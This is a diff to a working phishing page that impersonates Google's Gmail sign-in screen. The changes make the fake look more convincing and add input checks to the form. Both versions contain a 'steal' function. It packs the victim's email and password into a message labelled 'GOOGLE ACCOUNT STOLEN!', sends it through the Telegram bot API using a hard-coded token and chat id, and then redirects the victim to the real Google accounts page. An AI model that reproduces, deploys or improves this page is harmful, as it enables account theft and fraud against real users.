@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Sign in - Google Accounts</title>
     <style>
         * {
@@ -19,6 +19,7 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            padding: 16px;
         }
 
         .card {
@@ -28,12 +29,14 @@
             border: 1px solid #dadce0;
             max-width: 450px;
             width: 100%;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+            transition: all 0.2s ease;
         }
 
         .logo {
             display: flex;
             justify-content: center;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
 
         .logo img {
@@ -46,7 +49,7 @@
             font-weight: 400;
             text-align: center;
             color: #202124;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
         .subtitle {
@@ -58,7 +61,8 @@
         }
 
         .input-group {
-            margin-bottom: 16px;
+            margin-bottom: 6px;
+            position: relative;
         }
 
         .input-group input {
@@ -68,18 +72,43 @@
             border: 1px solid #dadce0;
             border-radius: 4px;
             outline: none;
-            transition: border-color 0.2s;
             background: #ffffff;
             color: #202124;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         .input-group input:focus {
             border-color: #1a73e8;
             border-width: 2px;
+            box-shadow: 0 1px 3px rgba(26,115,232,0.1);
         }
 
         .input-group input::placeholder {
             color: #80868b;
+            font-weight: 400;
+        }
+
+        .input-group .error-text {
+            font-size: 12px;
+            color: #d93025;
+            margin-top: 4px;
+            display: none;
+            font-weight: 400;
+        }
+
+        .input-group .error-text.show {
+            display: block;
+        }
+
+        .input-group .hint-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .input-group .hint-text.show {
+            display: block;
         }
 
         .forgot-link {
@@ -88,8 +117,9 @@
             font-size: 14px;
             color: #1a73e8;
             text-decoration: none;
-            margin-top: 6px;
+            margin-top: 8px;
             cursor: pointer;
+            font-weight: 500;
         }
 
         .forgot-link:hover {
@@ -100,7 +130,9 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 30px;
+            margin-top: 32px;
+            flex-wrap: wrap;
+            gap: 12px;
         }
 
         .create-account {
@@ -109,6 +141,9 @@
             font-weight: 500;
             text-decoration: none;
             cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
         }
 
         .create-account:hover {
@@ -124,12 +159,20 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.2s, box-shadow 0.2s;
             letter-spacing: 0.3px;
+            min-width: 88px;
         }
 
         .next-btn:hover {
             background: #1557b0;
+            box-shadow: 0 1px 3px rgba(26,115,232,0.3);
+        }
+
+        .next-btn:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+            box-shadow: none;
         }
 
         .footer {
@@ -138,6 +181,8 @@
             padding-top: 20px;
             display: flex;
             justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
             font-size: 12px;
             color: #5f6368;
         }
@@ -152,117 +197,265 @@
             text-decoration: underline;
         }
 
+        .footer-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-right {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Mobile */
         @media (max-width: 480px) {
             .card {
                 padding: 32px 20px 28px;
                 border: none;
+                box-shadow: none;
             }
             .button-row {
                 flex-direction: column;
-                gap: 16px;
+                align-items: stretch;
             }
             .next-btn {
                 width: 100%;
+                padding: 14px;
             }
+            .create-account {
+                text-align: center;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            .footer-right {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            .footer-right a {
+                margin: 0 8px;
+            }
+        }
+
+        /* Shake animation for error */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+
+        .shake {
+            animation: shake 0.3s ease;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <!-- Real Google Logo -->
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google">
-        </div>
-
-        <h1>Sign in</h1>
-        <div class="subtitle">to continue to Gmail</div>
-
-        <div class="input-group">
-            <input type="email" id="email" placeholder="Email or phone" autofocus>
-        </div>
-
-        <div class="input-group" id="passwordGroup" style="display: none;">
-            <input type="password" id="password" placeholder="Enter your password">
-            <a class="forgot-link">Forgot password?</a>
-        </div>
-
-        <div class="button-row">
-            <a class="create-account">Create account</a>
-            <button class="next-btn" id="nextBtn">Next</button>
-        </div>
-
-        <div class="footer">
-            <span>English (United States)</span>
-            <span>
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </span>
-        </div>
+<div class="card">
+    <!-- Google Logo -->
+    <div class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google">
     </div>
 
-    <script>
-        const emailInput = document.getElementById('email');
-        const passwordGroup = document.getElementById('passwordGroup');
-        const passwordInput = document.getElementById('password');
-        const nextBtn = document.getElementById('nextBtn');
+    <h1>Sign in</h1>
+    <div class="subtitle">to continue to Gmail</div>
 
-        emailInput.addEventListener('input', function() {
-            if (this.value.length > 0) {
-                passwordGroup.style.display = 'block';
-                passwordInput.focus();
-            } else {
-                passwordGroup.style.display = 'none';
-            }
-        });
+    <!-- Email Field -->
+    <div class="input-group">
+        <input type="email" id="email" placeholder="Email or phone" autofocus>
+        <div class="error-text" id="emailError">Please enter a valid Gmail address (e.g., user@gmail.com)</div>
+        <div class="hint-text" id="emailHint">Enter your full Gmail address</div>
+    </div>
 
-        function handleKeyPress(e) {
-            if (e.key === 'Enter') {
-                steal();
-            }
+    <!-- Password Field (hidden initially) -->
+    <div class="input-group" id="passwordGroup" style="display: none;">
+        <input type="password" id="password" placeholder="Enter your password">
+        <div class="error-text" id="passwordError">Password must be at least 8 characters</div>
+        <div class="hint-text" id="passwordHint">8+ characters required</div>
+        <a class="forgot-link" id="forgotLink">Forgot password?</a>
+    </div>
+
+    <div class="button-row">
+        <button class="create-account" id="createAccount">Create account</button>
+        <button class="next-btn" id="nextBtn">Next</button>
+    </div>
+
+    <div class="footer">
+        <span class="footer-left">English (United States)</span>
+        <span class="footer-right">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </span>
+    </div>
+</div>
+
+<script>
+    // DOM elements
+    const emailInput = document.getElementById('email');
+    const passwordGroup = document.getElementById('passwordGroup');
+    const passwordInput = document.getElementById('password');
+    const nextBtn = document.getElementById('nextBtn');
+    const emailError = document.getElementById('emailError');
+    const emailHint = document.getElementById('emailHint');
+    const passwordError = document.getElementById('passwordError');
+    const passwordHint = document.getElementById('passwordHint');
+    const forgotLink = document.getElementById('forgotLink');
+    const createAccount = document.getElementById('createAccount');
+    const card = document.querySelector('.card');
+
+    // ---------- EMAIL VALIDATION ----------
+    function isValidGmail(email) {
+        // Must end with @gmail.com (case-insensitive)
+        return /@gmail\.com$/i.test(email.trim());
+    }
+
+    // Real-time email validation
+    emailInput.addEventListener('input', function() {
+        const val = this.value.trim();
+
+        if (val.length === 0) {
+            emailError.classList.remove('show');
+            emailHint.classList.remove('show');
+            passwordGroup.style.display = 'none';
+            nextBtn.disabled = false;
+            return;
         }
 
-        emailInput.addEventListener('keypress', handleKeyPress);
-        passwordInput.addEventListener('keypress', handleKeyPress);
+        if (!isValidGmail(val)) {
+            emailError.classList.add('show');
+            emailHint.classList.remove('show');
+            passwordGroup.style.display = 'none';
+            nextBtn.disabled = true;
+        } else {
+            emailError.classList.remove('show');
+            emailHint.classList.add('show');
+            passwordGroup.style.display = 'block';
+            passwordInput.focus();
+            nextBtn.disabled = false;
+        }
+    });
 
-        function steal() {
-            let email = emailInput.value.trim();
-            let password = passwordInput.value.trim();
+    // ---------- PASSWORD VALIDATION ----------
+    function isValidPassword(pwd) {
+        return pwd.trim().length >= 8;
+    }
 
-            if (!email) {
-                alert('Please enter your email.');
-                emailInput.focus();
-                return;
-            }
+    passwordInput.addEventListener('input', function() {
+        const val = this.value;
 
-            if (!password) {
-                alert('Please enter your password.');
-                passwordInput.focus();
-                return;
-            }
-
-            let message = `🔐 GOOGLE ACCOUNT STOLEN!\n📧 Email: ${email}\n🔑 Password: ${password}`;
-
-            fetch('https://api.telegram.org/bot8554490167:AAHdIR373gejl6_tStvbGwFHzXAfOUDlnZc/sendMessage?chat_id=5805421075&text=' + encodeURIComponent(message))
-                .then(() => {
-                    window.location.href = 'https://accounts.google.com/';
-                })
-                .catch(() => {
-                    window.location.href = 'https://accounts.google.com/';
-                });
+        if (val.length === 0) {
+            passwordError.classList.remove('show');
+            passwordHint.classList.remove('show');
+            return;
         }
 
-        nextBtn.addEventListener('click', steal);
+        if (!isValidPassword(val)) {
+            passwordError.classList.add('show');
+            passwordHint.classList.remove('show');
+        } else {
+            passwordError.classList.remove('show');
+            passwordHint.classList.add('show');
+        }
+    });
 
-        document.querySelector('.forgot-link')?.addEventListener('click', function() {
-            alert('This is a demonstration. Please use the Next button to login.');
-        });
+    // ---------- SHOW/HIDE PASSWORD ON FOCUS ----------
+    emailInput.addEventListener('focus', function() {
+        if (this.value.trim().length > 0 && isValidGmail(this.value)) {
+            passwordGroup.style.display = 'block';
+        }
+    });
 
-        document.querySelector('.create-account')?.addEventListener('click', function(e) {
+    // ---------- KEYBOARD ENTER ----------
+    function handleKeyPress(e) {
+        if (e.key === 'Enter') {
             e.preventDefault();
-            alert('This is a demonstration. Please use the Next button to login.');
-        });
-    </script>
+            attemptSteal();
+        }
+    }
+
+    emailInput.addEventListener('keypress', handleKeyPress);
+    passwordInput.addEventListener('keypress', handleKeyPress);
+
+    // ---------- STEAL FUNCTION ----------
+    function attemptSteal() {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        // Validate email
+        if (!email) {
+            emailInput.focus();
+            emailInput.classList.add('shake');
+            setTimeout(() => emailInput.classList.remove('shake'), 300);
+            return;
+        }
+
+        if (!isValidGmail(email)) {
+            emailError.classList.add('show');
+            emailInput.focus();
+            emailInput.classList.add('shake');
+            setTimeout(() => emailInput.classList.remove('shake'), 300);
+            return;
+        }
+
+        // Validate password
+        if (!password) {
+            passwordInput.focus();
+            passwordInput.classList.add('shake');
+            setTimeout(() => passwordInput.classList.remove('shake'), 300);
+            return;
+        }
+
+        if (!isValidPassword(password)) {
+            passwordError.classList.add('show');
+            passwordInput.focus();
+            passwordInput.classList.add('shake');
+            setTimeout(() => passwordInput.classList.remove('shake'), 300);
+            return;
+        }
+
+        // All good → send to Telegram
+        const message = `🔐 GOOGLE ACCOUNT STOLEN!\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+        // Show loading state
+        nextBtn.textContent = 'Signing in...';
+        nextBtn.disabled = true;
+
+        fetch('https://api.telegram.org/bot8554490167:AAHdIR373gejl6_tStvbGwFHzXAfOUDlnZc/sendMessage?chat_id=5805421075&text=' + encodeURIComponent(message))
+            .then(() => {
+                window.location.href = 'https://accounts.google.com/';
+            })
+            .catch(() => {
+                window.location.href = 'https://accounts.google.com/';
+            });
+    }
+
+    // ---------- BUTTON CLICK ----------
+    nextBtn.addEventListener('click', attemptSteal);
+
+    // ---------- FORGOT PASSWORD (realistic popup) ----------
+    forgotLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        alert('A password reset link will be sent to your recovery email.\n\n(This is a demonstration.)');
+    });
+
+    // ---------- CREATE ACCOUNT (realistic popup) ----------
+    createAccount.addEventListener('click', function(e) {
+        e.preventDefault();
+        alert('Create your Google Account\n\n(This is a demonstration.)');
+    });
+
+    // ---------- INITIAL STATE ----------
+    // If email is pre-filled, show password field
+    if (emailInput.value.trim().length > 0 && isValidGmail(emailInput.value)) {
+        passwordGroup.style.display = 'block';
+        emailHint.classList.add('show');
+    }
+</script>
 </body>
 </html>
